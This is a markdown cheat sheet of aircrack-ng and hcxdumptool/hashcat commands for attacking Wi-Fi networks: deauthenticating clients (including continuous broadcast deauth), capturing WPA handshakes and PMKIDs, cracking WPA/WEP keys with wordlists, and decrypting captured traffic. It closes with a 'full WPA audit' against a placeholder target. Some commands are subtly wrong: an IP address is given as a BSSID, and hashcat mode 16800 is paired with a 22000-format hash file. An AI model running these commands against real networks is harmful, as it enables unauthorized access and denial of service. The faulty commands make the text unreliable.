# aircrack-ng CHEATSHEET

## Quick Reference

### Monitor Mode
```bash
airmon-ng check kill          # Kill interfering processes
airmon-ng start wlan0         # Enable monitor mode
airmon-ng stop wlan0mon       # Disable monitor mode
```

### Network Discovery
```bash
airodump-ng wlan0mon                              # Scan all networks
airodump-ng -c 6 -w capture wlan0mon              # Target specific channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon  # Target specific AP
```

### WPA Handshake Capture
```bash
# Terminal 1: Capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Deauth
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### WPA Cracking
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### WEP Cracking
```bash
# Capture IVs
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon  # Inject

# Crack (needs 20k+ IVs)
aircrack-ng wep-01.cap
aircrack-ng -z wep-01.cap  # PTW attack
```

### PMKID Attack
```bash
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 16800 hash.hc22000 wordlist.txt
```

### Deauth Attack
```bash
aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon  # Targeted
aireplay-ng -0 5 -a BSSID wlan0mon             # Broadcast
aireplay-ng -0 0 -a BSSID wlan0mon             # Continuous
```

### Injection Test
```bash
aireplay-ng -9 wlan0mon
```

### Decrypt Traffic
```bash
airdecap-ng -e "SSID" -p "password" capture.pcap
```

### Useful Options
```bash
-w wordlist.txt    # Specify wordlist
-b BSSID           # Target BSSID
-c CHANNEL         # Target channel
-0 count           # Deauth count (0=continuous)
```

---

## Target: 192.168.1.x

```bash
# Full WPA audit
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 11 --bssid 192.168.1.1 -w test wlan0mon
aireplay-ng -0 5 -a 192.168.1.1 wlan0mon
aircrack-ng -w rockyou.txt test-01.cap
```
